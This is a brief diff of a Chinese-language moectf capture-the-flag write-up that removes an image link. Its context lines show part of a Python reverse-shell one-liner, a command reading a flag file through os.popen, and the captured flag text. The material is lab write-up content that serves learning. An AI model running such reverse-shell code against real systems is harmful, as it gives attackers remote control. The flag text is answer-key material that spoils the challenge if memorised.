@@ -70,8 +70,6 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 直接os.popen('cat cd /flag').read()
 
-![image-20230924205939022](C:\Users\Jednersaous\AppData\Roaming\Typora\typora-user-images\image-20230924205939022.png)
-
 拿到第一个flag
 
 **flag1——moectf{Information-leakage-Is-dangerous!**
